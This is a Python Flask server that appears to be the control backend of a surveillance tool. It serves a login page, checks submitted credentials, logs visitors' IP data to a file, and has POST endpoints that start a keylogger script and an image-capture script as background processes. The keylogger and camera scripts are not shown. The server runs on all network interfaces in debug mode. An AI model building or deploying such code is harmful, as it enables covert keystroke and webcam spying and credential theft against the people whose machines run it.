from flask import Flask, send_from_directory, jsonify, redirect, request
from flask_cors import CORS
import subprocess
import os
import sys
import atexit
import signal
import json
from datetime import datetime

app = Flask(__name__, static_folder='.', static_url_path='/')
CORS(app)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
keylogger_process = None
capture_image_process = None

def cleanup_processes():
    global keylogger_process, capture_image_process
    for proc in (keylogger_process, capture_image_process):
        if proc and proc.poll() is None:
            try:
                print(f"Terminating process {proc.pid}")
                os.kill(proc.pid, signal.SIGTERM)
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                print(f"Force killing process {proc.pid}")
                os.kill(proc.pid, signal.SIGKILL)
            except Exception as e:
                print(f"Error terminating process {proc.pid}: {e}")

atexit.register(cleanup_processes)

@app.route('/')
def serve_index():
    return send_from_directory('.', 'index1.html')

@app.route('/kmit')
def serve_kmit():
    return send_from_directory('.', 'kmit.html')

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json() if request.is_json else request.form
    username = data.get('username')
    password = data.get('psw')
    with open('data.json', 'r') as f:
        import json
        credentials = json.load(f)
    if username == credentials.get('username1') and password == credentials.get('password1'):
        return jsonify({"status": "success", "message": "Login Successful"}), 200
    return jsonify({"status": "failure", "message": "Invalid credentials", "attempts_left": 2}), 401

@app.route('/run-capture-image', methods=['POST'])
def run_capture_image():
    global capture_image_process
    try:
        script_path = os.path.join(BASE_DIR, 'CaptureImage.py')
        capture_image_process = subprocess.Popen(
            [sys.executable, script_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            shell=False
        )
        stdout, stderr = capture_image_process.communicate()
        return jsonify({
            "status": "success",
            "output": stdout,
            "error": stderr
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/run-keylogger', methods=['POST'])
def run_keylogger():
    global keylogger_process
    try:
        script_path = os.path.join(BASE_DIR, 'keylogger.py')
        keylogger_process = subprocess.Popen(
            [sys.executable, script_path],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            shell=False
        )
        return jsonify({
            "status": "success",
            "message": "Keylogger started"
        })
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500
    
@app.route('/log-ip', methods=['POST'])
def log_ip():
    data = request.get_json()
    print("Received IP data:", data)  # Debug print
    if not data:
        return jsonify({"status": "error", "message": "No data received"}), 400
    log_dir = os.path.join(os.path.dirname(__file__), "data_stored")
    os.makedirs(log_dir, exist_ok=True)
    log_path = os.path.join(log_dir, "ip_log.txt")
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_path, 'a', encoding='utf-8') as f:
        f.write(f"{now} {json.dumps(data)}\n")
    return jsonify({"status": "logged"})

if __name__ == '__main__':
    try:
        app.run(debug=True, host='0.0.0.0', port=5000)
    except KeyboardInterrupt:
        cleanup_processes()
    except Exception as e:
        print(f"Flask app error: {e}")
        cleanup_processes()
    finally:
        cleanup_processes()